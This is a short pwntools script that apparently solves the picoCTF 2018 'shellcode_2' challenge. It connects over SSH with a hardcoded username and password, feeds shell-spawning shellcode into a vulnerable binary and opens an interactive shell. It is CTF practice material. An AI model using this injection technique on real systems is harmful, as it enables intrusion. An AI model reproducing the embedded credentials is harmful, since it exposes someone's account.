# python2
# coding=utf-8
from pwn import *

s=ssh(host='2018shell3.picoctf.com', user='Zeze', password='casper1014')
path='/problems/shellcode_2_0caa0f1860741079dd0a66ccf032c5f4/vuln'
# params = {"argv":path , "cwd": os.path.dirname(path)}
s.set_working_directory('/problems/shellcode_2_0caa0f1860741079dd0a66ccf032c5f4')
r=s.process('./vuln', shell=True)
# r=s.process(**params)
r.sendlineafter('Enter a string!', asm(shellcraft.sh()))
r.interactive()
